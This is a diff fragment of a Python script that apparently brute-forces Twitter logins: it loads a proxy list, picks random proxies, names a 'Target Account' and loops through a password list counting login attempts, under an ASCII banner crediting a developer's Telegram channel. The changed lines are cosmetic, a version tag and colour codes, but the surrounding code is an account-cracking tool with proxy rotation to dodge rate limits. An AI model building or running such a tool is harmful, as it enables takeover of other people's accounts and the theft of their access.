@@ -22,7 +22,7 @@ print('''\033[1;36m
              /--(
           -./,--'`-,
        ,^--(                    
-       ,--' `-,         
+       ,--' `-,         v1.2  
         **************************************
         * -> Development: 0xfff0800          *
         * -> Telegram: https://T.me/xfff0800 *
@@ -53,7 +53,7 @@ def proxy():
     try:
         pl.load_file(proxyList)
     except:
-        sys.exit('[!] Proxy File format has incorrect | EXIT...')
+        sys.exit('\033[1;31m[!] Proxy File format has incorrect | EXIT...\033[1;31m')
     pl.random()
     getProxy = pl.random().address()
     b.set_proxies(proxies={"https": getProxy})
@@ -66,7 +66,7 @@ def proxy():
 def Twitter():
     password = open(passwordList).read().splitlines()
     try_login = 0
-    print("Target Account: {}".format(username))
+    print("\033[1;31mTarget Account: {}\033[1;31m".format(username))
     for password in password:
         try_login += 1
         if try_login == 10:
